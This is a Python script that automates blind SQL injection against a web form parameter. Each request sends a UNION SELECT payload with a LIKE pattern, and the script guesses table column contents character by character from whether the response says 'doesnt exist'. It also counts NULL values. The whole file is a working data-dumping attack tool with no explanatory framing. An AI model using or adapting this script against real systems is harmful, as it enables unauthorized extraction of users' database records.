from requests import *
import json
from colorama import Fore,init;init()

#   a' UNION SELECT user FROM users WHERE user LIKE 'a%'#

def get_records(url,param,table,columnkey,columns):
    indx_name = "user"   #you must edit this part , your response index name

    chars = "qwertyuiopasdfghjklzxcvbnm. 1234567890<>/?\\()"

    def cnull(table,column):
        limit = 100
        t = 0
        while(t<limit):
            d = {param : f"0' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM {table} WHERE {column} IS NULL)={t}#"}
            req = post(url,data=d)
            res = json.loads(req.text)

            if(res[indx_name] == "doesnt exist"):
                t+=1
            else:
                return t
        return 0


    def gr(ch):
        chars = "qwertyuiopasdfghjklzxcvbnm 1234567890.<>/?\\()"
        data = f"{ch}"
        c = 0
        while(c<len(chars)):
            d = {param : f"a' UNION SELECT {columnkey} FROM {table} WHERE {column} LIKE '{data}{chars[c]}%'#"}
            req = post(url,data=d)
            res = json.loads(req.text)
            if(res[indx_name] == "doesnt exist"):
                c+=1
            else:
                data+=chars[c]
                c = 0
        return data

    for column in columns:
        print(Fore.GREEN+"[*] Dumping column { "+Fore.LIGHTRED_EX+column+Fore.GREEN+" } from { "+Fore.LIGHTRED_EX+table+Fore.GREEN+" }"+Fore.LIGHTYELLOW_EX)
        for char in chars:
            d = {param : f"a' UNION SELECT {columnkey} FROM {table} WHERE {column} LIKE '{char}%'#"}
            req = post(url,data=d)
            res = json.loads(req.text)

            if(res[indx_name] == "doesnt exist"):
                pass
            else:
                print(gr(char))
        print(Fore.CYAN + f"{cnull(table,column)} Null value found in column {column}\n\n\n\n" + Fore.LIGHTYELLOW_EX)